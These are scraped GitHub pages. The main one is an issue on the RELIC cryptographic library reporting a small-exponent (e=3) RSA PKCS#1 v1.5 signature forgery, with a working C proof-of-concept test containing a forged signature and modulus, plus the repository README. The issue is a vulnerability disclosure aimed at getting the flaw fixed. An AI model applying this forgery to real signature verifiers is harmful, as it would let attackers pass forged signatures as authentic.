=== Content from github.com_81c9d2a6_20250119_112028.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frelic-toolkit%2Frelic%2Fissues%2F154)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frelic-toolkit%2Frelic%2Fissues%2F154)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=relic-toolkit%2Frelic)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[relic-toolkit](/relic-toolkit)
/
**[relic](/relic-toolkit/relic)**
Public

* [Notifications](/login?return_to=%2Frelic-toolkit%2Frelic) You must be signed in to change notification settings
* [Fork
  180](/login?return_to=%2Frelic-toolkit%2Frelic)
* [Star
   468](/login?return_to=%2Frelic-toolkit%2Frelic)

* [Code](/relic-toolkit/relic)
* [Issues
  9](/relic-toolkit/relic/issues)
* [Pull requests
  2](/relic-toolkit/relic/pulls)
* [Actions](/relic-toolkit/relic/actions)
* [Projects
  0](/relic-toolkit/relic/projects)
* [Wiki](/relic-toolkit/relic/wiki)
* [Security](/relic-toolkit/relic/security)
* [Insights](/relic-toolkit/relic/pulse)

Additional navigation options

* [Code](/relic-toolkit/relic)
* [Issues](/relic-toolkit/relic/issues)
* [Pull requests](/relic-toolkit/relic/pulls)
* [Actions](/relic-toolkit/relic/actions)
* [Projects](/relic-toolkit/relic/projects)
* [Wiki](/relic-toolkit/relic/wiki)
* [Security](/relic-toolkit/relic/security)
* [Insights](/relic-toolkit/relic/pulse)

# PKCS1v1.5 implementation and Bleichenbacher-style small exponent signature forgeryÂ #154

[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy link[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy linkClosedClosed[PKCS1v1.5 implementation and Bleichenbacher-style small exponent signature forgery](#top)#154Copy link![@1one-w01f](https://avatars.githubusercontent.com/u/35460075?u=a1703d7eda800a8c6d04942299f7fc82cee2b26d&v=4&size=80)
## Description

![@1one-w01f](https://avatars.githubusercontent.com/u/35460075?u=a1703d7eda800a8c6d04942299f7fc82cee2b26d&v=4&size=48)[1one-w01f](https://github.com/1one-w01f)opened [on Jun 29, 2020](https://github.com/relic-toolkit/relic/issues/154#issue-647410334)

Hi there,

As I was testing the PKCS1v1.5 implementation inside RELIC, it appears to me that it might be susceptible to a Bleichenbacher-style small exponent signature forgery.

In a nut shell, there are mainly 2 issues in the code (both in `relic_cp_rsa.c`) that enables the attack:

1. The checks on the first 2 bytes to see whether they are indeed `0x00 | 0x01` actually doesn't lead to rejection of malformed inputs. Although [line 345](https://github.com/relic-toolkit/relic/blob/master/src/cp/relic_cp_rsa.c#L345) and [line 351](https://github.com/relic-toolkit/relic/blob/master/src/cp/relic_cp_rsa.c#L351) will set `result = RLC_ERR` if the prefix bytes do not match the expectation, the `result` variable is never checked later and will get overwritten on [line 374](https://github.com/relic-toolkit/relic/blob/master/src/cp/relic_cp_rsa.c#L374), hence the **first 2 bytes can take any arbitrary values** and the signature verification will still go through.
2. More importantly, the `do{ ... } while` loop on [line 357](https://github.com/relic-toolkit/relic/blob/master/src/cp/relic_cp_rsa.c#L357) only checks that the padding has not been terminated with a zero, but it doesn't actually require the each of the padding bytes to be `0xFF`, and because of this, the **padding can take arbitrary non-zero values** and the signature verification will still go through.

Together, this opens up the possibility of a Bleichenbacher-style small exponent signature forgery.

Here is a proof-of-concept forgery attack, based on the `test_cp.c` given in the source tree:

```
/**
 * @file
 *
 * Tests for implementation of cryptographic protocols.
 *
 * @version $Id$
 * @ingroup test
 */

#include <stdio.h>

#include "relic.h"
#include "relic_test.h"

#define MODULUS_SIZE_IN_BITS RLC_BN_BITS
#define MSG "hello world"

static int rsa(void) {
	int code = RLC_ERR;

	uint8_t sig[MODULUS_SIZE_IN_BITS / 8 + 1] =
	{   0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3f, 0x4a, 0xaf, 0xb8, 0x5f, 0xc2, 0x18, 0xd1,
0xf8, 0x39, 0x09, 0x15, 0x71, 0x0f, 0x6d, 0xc2, 0x93, 0x61, 0x55, 0xd9, 0x36, 0xbd, 0xae, 0xbe, 0x84, 0x60,
0x9b, 0xfa, 0x5c, 0xe4, 0x52, 0x27, 0xde, 0x78, 0x02, 0xcc, 0xd0, 0xa6, 0xee, 0x67, 0x94, 0x9d, 0xfd, 0x92,
0x85, 0x4f, 0x08, 0x35, 0x7f, 0x20, 0x2b, 0x55, 0x12, 0x1b, 0x81, 0xbf, 0xc2, 0x31, 0x1c, 0x2d, 0x95, 0x20,
0xff, 0x88, 0x3c, 0x3c, 0x24, 0x37, 0x1f, 0x2f, 0x68, 0xd4, 0x8b, 0xd0, 0x00, 0x19, 0xbb, 0x83, 0x0b, 0xc7,
0x3f, 0x55, 0xf4, 0x40, 0x3d, 0x9e, 0x31, 0x8a, 0x36, 0xbe, 0x67, 0x6c, 0x97, 0x27, 0x9f, 0xa8, 0x52, 0xbb,
0x3e, 0xb6, 0x63, 0xaa, 0x2b, 0xb9
	};
	int ol = MODULUS_SIZE_IN_BITS / 8 + 1;

	rsa_t pub;
	rsa_null(pub);

	RLC_TRY {

		rsa_new(pub);

		// set e to 3
		bn_set_2b(pub->e, 1);
		bn_add_dig(pub->e, pub->e, 1);

		// set n
		bn_read_str(pub->crt->n, "af5110f2c75400a4ceb31b3763303f71b6ee517dad3b108fd4b675774c9e2d5649784c2b3ba6b93b80175c79db9619b73b5b1e575f65faadfc613fa00b449895407ff696581eb7f76074b5857973db2b652da5df6198579784d959ee09e64424d3bb996310e8e84b8769a0d0e48d16608b56cb495bd0b5eb8f8267021469e0ade8c2d22d66ecd9a32067544e97c2ccc6ad115ca4e32f117ac34c5ceb0c0d0781af8e7f79d9950458a24b9e7c5ed645a75abee52cabf174d294219afedd8e78afd7386c627a0033cef568c09c08202a9a0a2f4409df0902e8345017504e7b50dbda99f5dc8212a99ca1dfad7434caab6013249e12cc98d8731fed698b9f667984dd1f89af5c33d84a7995062c4b92b49559154c3ee8b5f77ed48d50c391492325a027fe19cdb07bd103434627d14aec25a63a822025137649", 624, 16);

		TEST_BEGIN("rsa signature/verification is correct") {
			TEST_ASSERT(cp_rsa_ver(sig, ol, MSG, strlen(MSG), 0, pub) == 1, end);
		} TEST_END;

	} RLC_CATCH_ANY {
		RLC_ERROR(end);
	}
	code = RLC_OK;

end:
	rsa_free(pub);
	return code;
}

int main(void) {

	if (core_init() != RLC_OK) {
		core_clean();
		return 1;
	}

	util_banner("Tests for the CP module", 0);

#if defined(WITH_BN)

	util_banner("Protocols based on integer factorization:\n", 0);

	if (rsa() != RLC_OK) {
		core_clean();
		return 1;
	}

#endif

	util_banner("All tests have passed.\n", 0);

	core_clean();
	return 0;
}
```

For convenience I used a somewhat unconventional sized (2496-bit long) modulus. I used OpenSSL to generate it, but you can try it with a different 2496-bit long modulus and the forged signature should still work. The forgery algorithm should also work against "regular" sized (e.g. 2048-bit and 4096-bit long) moduli, though I have yet to have a chance to work on that, and I think the above proof-of-concept already serves the purpose.

Such a forgery should only work when `e` is small enough (which in most cases means `e = 3`), and although RELIC by default doesn't generate RSA keys with `e = 3`, there is a possibility that someone might use `e = 3` for specific application & interoperability needs, and nothing in the API is prohibiting the programming from doing it.

In any case, unless the plan is to completely drop the support of PKCS1v1.5, I'd suggest to have the issues in `relic_cp_rsa.c` fixed, as it is definitely possible (and not really that difficult) to make the signature verification much more robust.

More details on the Bleichenbacher-style signature forgery can be found in academic papers like [this](https://www.ndss-symposium.org/wp-content/uploads/2019/02/ndss2019_04A-4_Chau_paper.pdf) and [this](https://www-old.cdc.informatik.tu-darmstadt.de/reports/reports/sigflaw.pdf).

Finally, though it shouldn't matter much, this is the script I used (`preset/debug.sh`) to configure the build:

```
#!/bin/bash

cmake -DCHECK=on \
 -DALLOC=DYNAMIC \
 -DCOLOR=off \
 -DUSEENVCFLAGS=1 \
 -DWSIZE=8 \
 -DARCH= \
 -DDEBUG=on \
 -DSHLIB=on \
 -DSTLIB=on \
 -DTESTS=1 \
 -DBENCH=0 \
 -DWITH=ALL \
 -DBN_PRECI=2496 \
 -DCP_RSAPD=PKCS1 \
 $1
```
## Metadata

### Assignees

No one assigned

### Labels

No labelsNo labels
### Type

No type
### Projects

No projects
### Milestone

No milestone

### Relationships

None yet
### Development

No branches or pull requests
## Issue actions

## Footer

Â© 2025 GitHub,Â Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You canât perform that action at this time.



=== Content from github.com_5148059a_20250119_112029.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frelic-toolkit%2Frelic%2Ftree%2F32eb4c257fc80328061d66639b1cdb35dbed51a2)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frelic-toolkit%2Frelic%2Ftree%2F32eb4c257fc80328061d66639b1cdb35dbed51a2)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Ffiles%2Fdisambiguate&source=header-repo&source_repo=relic-toolkit%2Frelic)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[relic-toolkit](/relic-toolkit)
/
**[relic](/relic-toolkit/relic)**
Public

* [Notifications](/login?return_to=%2Frelic-toolkit%2Frelic) You must be signed in to change notification settings
* [Fork
  180](/login?return_to=%2Frelic-toolkit%2Frelic)
* [Star
   468](/login?return_to=%2Frelic-toolkit%2Frelic)

Code

### License

[View license](/relic-toolkit/relic/blob/main/LICENSE)

[468
stars](/relic-toolkit/relic/stargazers) [180
forks](/relic-toolkit/relic/forks) [Branches](/relic-toolkit/relic/branches) [Tags](/relic-toolkit/relic/tags) [Activity](/relic-toolkit/relic/activity)
 [Star](/login?return_to=%2Frelic-toolkit%2Frelic)

 [Notifications](/login?return_to=%2Frelic-toolkit%2Frelic) You must be signed in to change notification settings

* [Code](/relic-toolkit/relic)
* [Issues
  9](/relic-toolkit/relic/issues)
* [Pull requests
  2](/relic-toolkit/relic/pulls)
* [Actions](/relic-toolkit/relic/actions)
* [Projects
  0](/relic-toolkit/relic/projects)
* [Wiki](/relic-toolkit/relic/wiki)
* [Security](/relic-toolkit/relic/security)
* [Insights](/relic-toolkit/relic/pulse)

Additional navigation options

* [Code](/relic-toolkit/relic)
* [Issues](/relic-toolkit/relic/issues)
* [Pull requests](/relic-toolkit/relic/pulls)
* [Actions](/relic-toolkit/relic/actions)
* [Projects](/relic-toolkit/relic/projects)
* [Wiki](/relic-toolkit/relic/wiki)
* [Security](/relic-toolkit/relic/security)
* [Insights](/relic-toolkit/relic/pulse)

# relic-toolkit/relic

   Â 32eb4c2[Branches](/relic-toolkit/relic/branches)[Tags](/relic-toolkit/relic/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commitÂ History[2,823 Commits](/relic-toolkit/relic/commits/32eb4c257fc80328061d66639b1cdb35dbed51a2/) | | |
| [art](/relic-toolkit/relic/tree/32eb4c257fc80328061d66639b1cdb35dbed51a2/art "art") | | [art](/relic-toolkit/relic/tree/32eb4c257fc80328061d66639b1cdb35dbed51a2/art "art") |  |  |
| [bench](/relic-toolkit/relic/tree/32eb4c257fc80328061d66639b1cdb35dbed51a2/bench "bench") | | [bench](/relic-toolkit/relic/tree/32eb4c257fc80328061d66639b1cdb35dbed51a2/bench "bench") |  |  |
| [cmake](/relic-toolkit/relic/tree/32eb4c257fc80328061d66639b1cdb35dbed51a2/cmake "cmake") | | [cmake](/relic-toolkit/relic/tree/32eb4c257fc80328061d66639b1cdb35dbed51a2/cmake "cmake") |  |  |
| [demo](/relic-toolkit/relic/tree/32eb4c257fc80328061d66639b1cdb35dbed51a2/demo "demo") | | [demo](/relic-toolkit/relic/tree/32eb4c257fc80328061d66639b1cdb35dbed51a2/demo "demo") |  |  |
| [doc](/relic-toolkit/relic/tree/32eb4c257fc80328061d66639b1cdb35dbed51a2/doc "doc") | | [doc](/relic-toolkit/relic/tree/32eb4c257fc80328061d66639b1cdb35dbed51a2/doc "doc") |  |  |
| [include](/relic-toolkit/relic/tree/32eb4c257fc80328061d66639b1cdb35dbed51a2/include "include") | | [include](/relic-toolkit/relic/tree/32eb4c257fc80328061d66639b1cdb35dbed51a2/include "include") |  |  |
| [preset](/relic-toolkit/relic/tree/32eb4c257fc80328061d66639b1cdb35dbed51a2/preset "preset") | | [preset](/relic-toolkit/relic/tree/32eb4c257fc80328061d66639b1cdb35dbed51a2/preset "preset") |  |  |
| [src](/relic-toolkit/relic/tree/32eb4c257fc80328061d66639b1cdb35dbed51a2/src "src") | | [src](/relic-toolkit/relic/tree/32eb4c257fc80328061d66639b1cdb35dbed51a2/src "src") |  |  |
| [test](/relic-toolkit/relic/tree/32eb4c257fc80328061d66639b1cdb35dbed51a2/test "test") | | [test](/relic-toolkit/relic/tree/32eb4c257fc80328061d66639b1cdb35dbed51a2/test "test") |  |  |
| [tools](/relic-toolkit/relic/tree/32eb4c257fc80328061d66639b1cdb35dbed51a2/tools "tools") | | [tools](/relic-toolkit/relic/tree/32eb4c257fc80328061d66639b1cdb35dbed51a2/tools "tools") |  |  |
| [.gitignore](/relic-toolkit/relic/blob/32eb4c257fc80328061d66639b1cdb35dbed51a2/.gitignore ".gitignore") | | [.gitignore](/relic-toolkit/relic/blob/32eb4c257fc80328061d66639b1cdb35dbed51a2/.gitignore ".gitignore") |  |  |
| [.indent.pro](/relic-toolkit/relic/blob/32eb4c257fc80328061d66639b1cdb35dbed51a2/.indent.pro ".indent.pro") | | [.indent.pro](/relic-toolkit/relic/blob/32eb4c257fc80328061d66639b1cdb35dbed51a2/.indent.pro ".indent.pro") |  |  |
| [.travis.yml](/relic-toolkit/relic/blob/32eb4c257fc80328061d66639b1cdb35dbed51a2/.travis.yml ".travis.yml") | | [.travis.yml](/relic-toolkit/relic/blob/32eb4c257fc80328061d66639b1cdb35dbed51a2/.travis.yml ".travis.yml") |  |  |
| [CMakeLists.txt](/relic-toolkit/relic/blob/32eb4c257fc80328061d66639b1cdb35dbed51a2/CMakeLists.txt "CMakeLists.txt") | | [CMakeLists.txt](/relic-toolkit/relic/blob/32eb4c257fc80328061d66639b1cdb35dbed51a2/CMakeLists.txt "CMakeLists.txt") |  |  |
| [COPYRIGHT](/relic-toolkit/relic/blob/32eb4c257fc80328061d66639b1cdb35dbed51a2/COPYRIGHT "COPYRIGHT") | | [COPYRIGHT](/relic-toolkit/relic/blob/32eb4c257fc80328061d66639b1cdb35dbed51a2/COPYRIGHT "COPYRIGHT") |  |  |
| [LICENSE](/relic-toolkit/relic/blob/32eb4c257fc80328061d66639b1cdb35dbed51a2/LICENSE "LICENSE") | | [LICENSE](/relic-toolkit/relic/blob/32eb4c257fc80328061d66639b1cdb35dbed51a2/LICENSE "LICENSE") |  |  |
| [LICENSE.Apache-2.0](/relic-toolkit/relic/blob/32eb4c257fc80328061d66639b1cdb35dbed51a2/LICENSE.Apache-2.0 "LICENSE.Apache-2.0") | | [LICENSE.Apache-2.0](/relic-toolkit/relic/blob/32eb4c257fc80328061d66639b1cdb35dbed51a2/LICENSE.Apache-2.0 "LICENSE.Apache-2.0") |  |  |
| [LICENSE.LGPL-2.1](/relic-toolkit/relic/blob/32eb4c257fc80328061d66639b1cdb35dbed51a2/LICENSE.LGPL-2.1 "LICENSE.LGPL-2.1") | | [LICENSE.LGPL-2.1](/relic-toolkit/relic/blob/32eb4c257fc80328061d66639b1cdb35dbed51a2/LICENSE.LGPL-2.1 "LICENSE.LGPL-2.1") |  |  |
| [README.md](/relic-toolkit/relic/blob/32eb4c257fc80328061d66639b1cdb35dbed51a2/README.md "README.md") | | [README.md](/relic-toolkit/relic/blob/32eb4c257fc80328061d66639b1cdb35dbed51a2/README.md "README.md") |  |  |
| View all files | | |

## Repository files navigation

* README
* License
* License
#

[![Project stats](https://camo.githubusercontent.com/d9d26303f8acfd8eadb9a7c3c7020593ab9643402d97e2b7eba5536ec138bc5b/68747470733a2f2f7777772e6f70656e6875622e6e65742f702f72656c69632d746f6f6c6b69742f776964676574732f70726f6a6563745f7468696e5f62616467652e676966)](https://www.openhub.net/p/relic-toolkit)
[![Build Status](https://camo.githubusercontent.com/a7628ad340cdda1ee16ffb06456c04e26159c167e380a98258f0074806760313/68747470733a2f2f7472617669732d63692e6f72672f72656c69632d746f6f6c6b69742f72656c69632e7376673f6272616e63683d6d6173746572)](https://travis-ci.org/relic-toolkit/relic)
[![Code Quality: Cpp](https://camo.githubusercontent.com/13ac5b0ad49a114258d4be2ced3192011d84f28555ced136424f8702a104f298/68747470733a2f2f696d672e736869656c64732e696f2f6c67746d2f67726164652f6370702f672f72656c69632d746f6f6c6b69742f72656c69632e7376673f6c6f676f3d6c67746d266c6f676f57696474683d3138)](https://lgtm.com/projects/g/relic-toolkit/relic/context%3Acpp)
[![Total Alerts](https://camo.githubusercontent.com/b8976b79d33a852017920d0fd9977ceb4ec3dce7df92e87cb060f58f946f5994/68747470733a2f2f696d672e736869656c64732e696f2f6c67746d2f616c657274732f672f72656c69632d746f6f6c6b69742f72656c69632e7376673f6c6f676f3d6c67746d266c6f676f57696474683d3138)](https://lgtm.com/projects/g/relic-toolkit/relic/alerts)

RELIC is a modern cryptographic meta-toolkit with emphasis on efficiency and flexibility. RELIC can be used to build efficient and usable cryptographic toolkits tailored for specific security levels and algorithmic choices.

### Goals

RELIC is an ongoing project and features will be added on demand. The focus is to provide:

* Ease of portability and inclusion of architecture-dependent code
* Simple experimentation with alternative implementations
* Tests and benchmarks for every implemented function
* Flexible configuration
* Maximum efficiency

### Algorithms

RELIC implements to date:

* Multiple-precision integer arithmetic
* Prime and Binary field arithmetic
* Elliptic curves over prime and binary fields (NIST curves and pairing-friendly curves)
* Bilinear maps and related extension fields
* Cryptographic protocols (RSA, Rabin, ECDSA, ECMQV, ECSS (Schnorr), ECIES, Sakai-Ohgishi-Kasahara ID-based authenticated key agreement, Boneh-Lynn-Schacham and Boneh-Boyen short signatures, Paillier and Benaloh homomorphic encryption systems)

### Citing

If you use RELIC, please cite using the template below:

```
@misc{relic-toolkit,
    author = {D. F. Aranha and C. P. L. GouvÃªa and T. Markmann and R. S. Wahby and K. Liao},
    title = {{RELIC is an Efficient LIbrary for Cryptography}},
    howpublished = {\url{https://github.com/relic-toolkit/relic}},
}

```

### Build instructions

Instructions for building the library can be found in the [Wiki](https://github.com/relic-toolkit/relic/wiki/Building).

### Support

You can probably get some help over the official mailing list at `relic-discuss@googlegroups.com`

If you like the library, please consider supporting development through [Paypal](https://www.paypal.com/cgi-bin/webscr?cmd=_donations&business=R7D6ZE3BLMTF2&lc=BR&item_name=RELIC%20Development&currency_code=USD&bn=PP%2dDonationsBF%3abtn_donateCC_LG%2egif%3aNonHosted).

### Licensing

This work is dual-licensed under Apache 2.0 and LGPL 2.1-or-above to encourage collaboration with other research groups and contributions from the industry. You can choose between one of them if you use this work.

`SPDX-License-Identifier: Apache-2.0 OR LGPL-2.1`

Starting from version 0.3.3, static linking and changes in the configuration or build system are explicitly exempted from representing derived works. Please refer to the LICENSE files for additional details.

### Disclaimer

RELIC is at most alpha-quality software. Implementations may not be correct or secure and may include patented algorithms. There are *many* configuration options which make the library horribly insecure. Backward API compatibility with early versions may not necessarily be maintained. Use at your own risk.

## About

Code

### Resources

[Readme](#readme-ov-file)
### License

[View license](/relic-toolkit/relic/blob/main/LICENSE)

[Activity](/relic-toolkit/relic/activity)
[Custom properties](/relic-toolkit/relic/custom-properties)
### Stars

[**468**
stars](/relic-toolkit/relic/stargazers)
### Watchers

[**33**
watching](/relic-toolkit/relic/watchers)
### Forks

[**180**
forks](/relic-toolkit/relic/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Frelic-toolkit%2Frelic&report=relic-toolkit+%28user%29)

## [Releases 12](/relic-toolkit/relic/releases)

[RELIC version 0.7.0
Latest

Dec 27, 2024](/relic-toolkit/relic/releases/tag/0.7.0)
[+ 11 releases](/relic-toolkit/relic/releases)

## [Packages 0](/orgs/relic-toolkit/packages?repo_name=relic)

No packages published

## [Contributors 46](/relic-toolkit/relic/graphs/contributors)

[+ 32 contributors](/relic-toolkit/relic/graphs/contributors)

## Languages

* [C
  82.6%](/relic-toolkit/relic/search?l=c)
* [Assembly
  15.1%](/relic-toolkit/relic/search?l=assembly)
* [CMake
  1.3%](/relic-toolkit/relic/search?l=cmake)
* Other
  1.0%

## Footer

Â© 2025 GitHub,Â Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You canât perform that action at this time.



=== Content from github.com_de0f7e4f_20250119_112028.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frelic-toolkit%2Frelic%2Fcommit%2F76c9a1fdf19d9e92e566a77376673e522aae9f80)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
